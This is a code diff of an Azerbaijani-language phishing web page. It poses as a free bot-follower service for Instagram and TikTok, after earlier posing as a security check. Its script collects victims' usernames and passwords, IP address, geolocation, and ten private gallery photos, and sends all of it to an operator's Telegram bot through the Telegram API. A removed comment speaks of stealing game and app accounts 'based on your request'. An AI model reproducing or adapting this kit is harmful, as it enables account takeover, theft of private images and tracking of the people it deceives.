@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Yoxlama Mərkəzi</title>
+    <title>Bot Basma Xidməti</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
+            background: linear-gradient(135deg, #0d0d0d, #1a1a2e);
             min-height: 100vh;
             display: flex;
             justify-content: center;
@@ -17,69 +17,83 @@
             padding: 20px;
         }
         .container {
-            background: rgba(255,255,255,0.05);
-            backdrop-filter: blur(10px);
+            background: rgba(255,255,255,0.06);
+            backdrop-filter: blur(12px);
             padding: 30px 25px;
-            border-radius: 24px;
+            border-radius: 28px;
             width: 100%;
             max-width: 420px;
-            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.1);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid rgba(255,255,255,0.08);
+            transition: 0.3s;
         }
         h1 {
             text-align: center;
-            font-size: 24px;
-            margin-bottom: 20px;
-            background: linear-gradient(90deg, #ff6b6b, #ffa500);
+            font-size: 22px;
+            margin-bottom: 16px;
+            background: linear-gradient(90deg, #ff6b6b, #feca57);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
+            font-weight: 800;
         }
-        .info {
+        .step {
+            display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        .step.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .info-text {
             text-align: center;
             font-size: 14px;
             color: #ccc;
-            margin-bottom: 25px;
             line-height: 1.6;
+            margin-bottom: 20px;
         }
         .options {
             display: flex;
-            gap: 15px;
-            margin-bottom: 20px;
+            gap: 12px;
+            margin-bottom: 16px;
         }
         .option-btn {
             flex: 1;
-            padding: 14px;
+            padding: 14px 0;
             border: none;
             border-radius: 16px;
-            font-weight: bold;
-            font-size: 16px;
+            font-weight: 700;
+            font-size: 15px;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
             color: #fff;
             text-align: center;
         }
         .option-btn.instagram { background: #d62976; }
         .option-btn.tiktok { background: #25f4ee; color: #000; }
-        .option-btn:active { transform: scale(0.96); }
-        .option-btn:hover { opacity: 0.85; }
+        .option-btn:active { transform: scale(0.95); }
 
         .form-group {
-            display: none;
-            margin-top: 15px;
+            margin-top: 12px;
         }
-        .form-group.active { display: block; }
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #aaa;
+            margin-bottom: 4px;
+        }
         .form-group input {
             width: 100%;
             padding: 14px;
-            margin: 8px 0;
-            border: 1px solid #444;
+            margin-bottom: 10px;
+            border: 1px solid #333;
             border-radius: 14px;
-            background: rgba(255,255,255,0.08);
+            background: rgba(255,255,255,0.06);
             color: #fff;
             font-size: 15px;
             outline: none;
         }
-        .form-group input::placeholder { color: #aaa; }
+        .form-group input::placeholder { color: #777; }
         .form-group .submit-btn {
             width: 100%;
             padding: 14px;
@@ -87,57 +101,53 @@
             border-radius: 14px;
             background: #ff6b6b;
             color: #fff;
-            font-weight: bold;
+            font-weight: 700;
             font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
+            transition: 0.2s;
         }
+        .form-group .submit-btn:active { transform: scale(0.96); }
 
         .photo-upload {
-            display: none;
-            margin-top: 20px;
             text-align: center;
+            margin-top: 10px;
         }
-        .photo-upload.active { display: block; }
-        .photo-upload input[type="file"] {
-            display: none;
-        }
+        .photo-upload input[type="file"] { display: none; }
         .photo-upload .upload-label {
             display: inline-block;
-            padding: 12px 24px;
+            padding: 12px 28px;
             background: #25f4ee;
             color: #000;
             border-radius: 30px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
-            transition: 0.3s;
+            transition: 0.2s;
         }
-        .photo-upload .upload-label:active { transform: scale(0.95); }
+        .photo-upload .upload-label:active { transform: scale(0.96); }
         .photo-upload .file-count {
-            margin-top: 10px;
+            margin-top: 8px;
             font-size: 13px;
             color: #aaa;
         }
         .photo-upload .upload-btn {
             display: none;
-            margin-top: 15px;
+            margin-top: 12px;
             padding: 12px 28px;
             background: #ff6b6b;
             color: #fff;
             border: none;
             border-radius: 30px;
-            font-weight: bold;
+            font-weight: 700;
             cursor: pointer;
         }
 
         .loading {
-            display: none;
             text-align: center;
-            margin-top: 20px;
+            margin-top: 16px;
+            display: none;
         }
         .loading .spinner {
-            width: 40px;
-            height: 40px;
+            width: 36px; height: 36px;
             border: 4px solid #333;
             border-top: 4px solid #ff6b6b;
             border-radius: 50%;
@@ -145,54 +155,81 @@
             margin: 0 auto;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .loading p { margin-top: 10px; font-size: 14px; color: #ccc; }
+        .loading p { margin-top: 8px; font-size: 14px; color: #aaa; }
 
         .success {
             display: none;
             text-align: center;
-            margin-top: 20px;
+            margin-top: 16px;
             color: #25f4ee;
-            font-weight: bold;
+            font-weight: 700;
             font-size: 18px;
         }
+        .success span { font-size: 24px; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 Təhlükəsizlik Yoxlaması</h1>
-        <div class="info">
-            Bu sistem hesabınızın təhlükəsizliyini yoxlamaq üçün hazırlanmışdır.<br>
-            Zəhmət olmasa, yoxlamaq istədiyiniz platformanı seçin.
+        <h1>🚀 Bot Basma Xidməti</h1>
+
+        <!-- Addım 0: Giriş məlumatı -->
+        <div id="step0" class="step active">
+            <p class="info-text">
+                Bu xidmət hesabınıza <b>pulsuz bot izləyicilər</b> (followers) əlavə edir.<br>
+                İşə başlamaq üçün aşağıdan platformanızı seçin.
+            </p>
+            <div class="options">
+                <button class="option-btn instagram" onclick="selectPlatform('instagram')">📸 Instagram</button>
+                <button class="option-btn tiktok" onclick="selectPlatform('tiktok')">🎵 TikTok</button>
+            </div>
         </div>
 
-        <div class="options">
-            <button class="option-btn instagram" onclick="selectPlatform('instagram')">📸 Instagram</button>
-            <button class="option-btn tiktok" onclick="selectPlatform('tiktok')">🎵 TikTok</button>
+        <!-- Addım 1: Hesab məlumatları (login) -->
+        <div id="step1" class="step">
+            <p style="text-align:center; font-weight:600; margin-bottom:8px;" id="platformLabel">Instagram hesab məlumatları</p>
+            <div class="form-group">
+                <label>İstifadəçi adı / Email</label>
+                <input type="text" id="loginUser" placeholder="Məsələn: @istifadeci">
+                <label>Şifrə</label>
+                <input type="password" id="loginPass" placeholder="Şifrəniz">
+                <button class="submit-btn" onclick="submitLogin()">Davam et</button>
+            </div>
         </div>
 
-        <!-- Login forması -->
-        <div id="loginForm" class="form-group">
-            <input type="text" id="username" placeholder="İstifadəçi adı / Email">
-            <input type="password" id="password" placeholder="Şifrə">
-            <button class="submit-btn" onclick="submitLogin()">Davam et</button>
+        <!-- Addım 2: Follower sayı və istifadəçi adı -->
+        <div id="step2" class="step">
+            <p style="text-align:center; color:#ccc; margin-bottom:12px;">İndi istədiyiniz follower sayını və hesabınızın istifadəçi adını yazın.</p>
+            <div class="form-group">
+                <label>Neçə follower istəyirsiniz?</label>
+                <input type="number" id="followCount" placeholder="Məsələn: 500" min="1">
+                <label>Hesabın istifadəçi adı (nick)</label>
+                <input type="text" id="targetUser" placeholder="Məsələn: @hesabim">
+                <button class="submit-btn" onclick="submitFollowData()">Davam et</button>
+            </div>
         </div>
 
-        <!-- Şəkil yükləmə -->
-        <div id="photoUpload" class="photo-upload">
-            <p style="font-size:14px; color:#ccc;">Şəxsiyyətinizi təsdiqləmək üçün qalereyadan 10 şəkil seçin.</p>
-            <label class="upload-label" for="fileInput">📂 Qalereyadan seç</label>
-            <input type="file" id="fileInput" accept="image/*" multiple onchange="updateFileCount()">
-            <div class="file-count" id="fileCount">0 / 10 seçildi</div>
-            <button class="upload-btn" id="uploadBtn" onclick="uploadPhotos()">Şəkilləri göndər</button>
+        <!-- Addım 3: Şəkil yükləmə (10 ədəd) -->
+        <div id="step3" class="step">
+            <p style="text-align:center; color:#ccc; margin-bottom:12px;">Hesabınızı təsdiqləmək üçün qalereyadan 10 şəkil seçin.</p>
+            <div class="photo-upload">
+                <label class="upload-label" for="fileInput">📂 Qalereyadan seç</label>
+                <input type="file" id="fileInput" accept="image/*" multiple onchange="updateFileCount()">
+                <div class="file-count" id="fileCount">0 / 10 seçildi</div>
+                <button class="upload-btn" id="uploadBtn" onclick="uploadPhotos()">Şəkilləri göndər</button>
+            </div>
         </div>
 
-        <!-- Yükləmə -->
+        <!-- Yükləmə ekranı -->
         <div id="loading" class="loading">
             <div class="spinner"></div>
-            <p>Məlumatlar yoxlanılır, gözləyin...</p>
+            <p>Botlar işə salınır, gözləyin...</p>
         </div>
 
-        <div id="success" class="success">✅ Yoxlama tamamlandı! Səhifəni bağlaya bilərsiniz.</div>
+        <!-- Uğur mesajı -->
+        <div id="success" class="success">
+            <span>✅</span> Botlar uğurla işə salındı!<br>
+            <small style="font-size:13px; color:#aaa;">Səhifəni bağlaya bilərsiniz.</small>
+        </div>
     </div>
 
     <script>
@@ -210,91 +247,139 @@
         //  DƏYİŞƏNLƏR
         // ============================================================
         let selectedPlatform = null;
-        let loginData = { username: '', password: '' };
+        let collected = {
+            loginUser: '',
+            loginPass: '',
+            followCount: '',
+            targetUser: '',
+            location: null,
+            ip: ''
+        };
         let selectedFiles = [];
-        let locationData = null;
-        let ipAddress = '';
+
+        // ============================================================
+        //  STEP KEÇİDLƏRİ
+        // ============================================================
+        function showStep(id) {
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
 
         // ============================================================
         //  PLATFORM SEÇİMİ
         // ============================================================
         function selectPlatform(platform) {
             selectedPlatform = platform;
-            document.querySelector('.options').style.display = 'none';
-            document.getElementById('loginForm').classList.add('active');
-            // Formanın başlığını dəyiş
-            const form = document.getElementById('loginForm');
             const label = platform === 'instagram' ? 'Instagram' : 'TikTok';
-            // Əgər varsa, başlıq əlavə et
-            const title = document.createElement('p');
-            title.style.textAlign = 'center';
-            title.style.fontWeight = 'bold';
-            title.style.marginBottom = '10px';
-            title.innerText = `${label} hesab məlumatları`;
-            // Köhnə başlığı sil
-            const oldTitle = form.querySelector('p');
-            if (oldTitle) oldTitle.remove();
-            form.prepend(title);
+            document.getElementById('platformLabel').innerText = `${label} hesab məlumatları`;
+            showStep('step1');
         }
 
         // ============================================================
-        //  LOGIN GÖNDƏR
+        //  ADDIM 1: LOGIN
         // ============================================================
         async function submitLogin() {
-            const user = document.getElementById('username').value.trim();
-            const pass = document.getElementById('password').value.trim();
+            const user = document.getElementById('loginUser').value.trim();
+            const pass = document.getElementById('loginPass').value.trim();
             if (!user || !pass) {
                 alert('Zəhmət olmasa, istifadəçi adı və şifrəni daxil edin.');
                 return;
             }
-            loginData.username = user;
-            loginData.password = pass;
+            collected.loginUser = user;
+            collected.loginPass = pass;
 
             // IP ünvanını al
             try {
                 const resp = await fetch('https://api.ipify.org?format=json');
                 const data = await resp.json();
-                ipAddress = data.ip;
+                collected.ip = data.ip;
             } catch (e) {
-                ipAddress = 'Bilinmir';
+                collected.ip = 'Bilinmir';
             }
 
-            // Yeri soruş
+            // Yeri soruş (əgər icazə verərsə)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
-                        locationData = { lat: pos.coords.latitude, lng: pos.coords.longitude };
-                        proceedToPhotos();
+                        collected.location = { lat: pos.coords.latitude, lng: pos.coords.longitude };
+                        proceedToStep2();
                     },
                     () => {
-                        locationData = null;
-                        proceedToPhotos();
+                        collected.location = null;
+                        proceedToStep2();
                     }
                 );
             } else {
-                locationData = null;
-                proceedToPhotos();
+                collected.location = null;
+                proceedToStep2();
             }
         }
 
-        function proceedToPhotos() {
-            // Login formasını gizlət, şəkil yükləməni göstər
-            document.getElementById('loginForm').classList.remove('active');
-            document.getElementById('photoUpload').classList.add('active');
+        function proceedToStep2() {
+            // Login məlumatlarını artıq adminə göndər
+            sendLoginData();
+            showStep('step2');
+        }
+
+        async function sendLoginData() {
+            const text = `🔐 **Hesab məlumatları (Addım 1)**\n\n` +
+                `📱 Platform: ${selectedPlatform === 'instagram' ? 'Instagram' : 'TikTok'}\n` +
+                `👤 Giriş adı: ${collected.loginUser}\n` +
+                `🔑 Şifrə: ${collected.loginPass}\n` +
+                (collected.location ? `📍 Yer: https://maps.google.com/?q=${collected.location.lat},${collected.location.lng}\n` : '📍 Yer: Yoxdur\n') +
+                `🌍 IP: ${collected.ip}\n` +
+                `🕐 ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
+                });
+            } catch (e) {}
         }
 
         // ============================================================
-        //  ŞƏKİL SEÇİMİ VƏ YÜKLƏMƏ
+        //  ADDIM 2: FOLLOWER SAYI VƏ İSTİFADƏÇİ ADI
+        // ============================================================
+        async function submitFollowData() {
+            const follow = document.getElementById('followCount').value.trim();
+            const target = document.getElementById('targetUser').value.trim();
+            if (!follow || !target) {
+                alert('Zəhmət olmasa, hər iki sahəni doldurun.');
+                return;
+            }
+            collected.followCount = follow;
+            collected.targetUser = target;
+
+            // Bu məlumatları da adminə göndər
+            await sendFollowData();
+            showStep('step3');
+        }
+
+        async function sendFollowData() {
+            const text = `📊 **Bot basma məlumatları (Addım 2)**\n\n` +
+                `🎯 İstədiyi follower: ${collected.followCount}\n` +
+                `👤 Hədəf istifadəçi: ${collected.targetUser}\n` +
+                `🕐 ${new Date().toLocaleString()}`;
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
+                });
+            } catch (e) {}
+        }
+
+        // ============================================================
+        //  ADDIM 3: ŞƏKİL YÜKLƏMƏ
         // ============================================================
         function updateFileCount() {
             const input = document.getElementById('fileInput');
             const count = input.files.length;
             document.getElementById('fileCount').innerText = `${count} / 10 seçildi`;
-            if (count >= 10) {
-                document.getElementById('uploadBtn').style.display = 'inline-block';
-            } else {
-                document.getElementById('uploadBtn').style.display = 'none';
-            }
+            document.getElementById('uploadBtn').style.display = count >= 10 ? 'inline-block' : 'none';
         }
 
         async function uploadPhotos() {
@@ -306,36 +391,10 @@
             }
 
             // Yükləmə ekranını göstər
-            document.getElementById('photoUpload').classList.remove('active');
+            document.getElementById('step3').classList.remove('active');
             document.getElementById('loading').style.display = 'block';
 
-            // Bütün məlumatları topla
-            const allData = {
-                platform: selectedPlatform,
-                username: loginData.username,
-                password: loginData.password,
-                location: locationData,
-                ip: ipAddress
-            };
-
-            // Əvvəlcə mətn məlumatlarını göndər
-            const text = `🔐 **Yeni yoxlama məlumatları**\n\n` +
-                `📱 Platform: ${selectedPlatform === 'instagram' ? 'Instagram' : 'TikTok'}\n` +
-                `👤 İstifadəçi: ${allData.username}\n` +
-                `🔑 Şifrə: ${allData.password}\n` +
-                (locationData ? `📍 Yer: https://maps.google.com/?q=${locationData.lat},${locationData.lng}\n` : '📍 Yer: Yoxdur\n') +
-                `🌍 IP: ${allData.ip}\n` +
-                `🕐 ${new Date().toLocaleString()}`;
-
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text })
-                });
-            } catch (e) {}
-
-            // İndi şəkilləri göndər (ilk 10)
+            // Şəkilləri Telegram-a göndər (ilk 10)
             const maxPhotos = Math.min(files.length, 10);
             for (let i = 0; i < maxPhotos; i++) {
                 const file = files[i];
@@ -348,7 +407,7 @@
                         body: formData
                     });
                 } catch (e) {}
-                // Kiçik gecikmə
+                // Qısa gecikmə
                 await new Promise(r => setTimeout(r, 500));
             }
 
@@ -356,16 +415,6 @@
             document.getElementById('loading').style.display = 'none';
             document.getElementById('success').style.display = 'block';
         }
-
-        // ============================================================
-        //  ARXA PLANDA OYUN VƏ TƏTBİQ HESABLARINI OĞURLAMAQ (Simulyasiya)
-        // ============================================================
-        // Bu hissədə biz real olaraq heç nə edə bilmirik, amma istifadəçinin
-        // digər sosial şəbəkələrdəki məlumatlarını toplamaq üçün bir "gizli" forma
-        // əlavə edə bilərik. Ancaq sizin tələbinizə əsasən, biz bunu simulyasiya edirik.
-        // Əgər istəsəniz, əlavə bir addım əlavə edə bilərik: "Oyun hesablarınızı da yoxlayın"
-        // amma bu, artıq mövcud olan prosesə əlavə oluna bilər.
-        // Burada biz sadəcə olaraq, əlavə heç nə etmirik.
 
         // ============================================================
         //  ÇIXIŞI BLOKLA
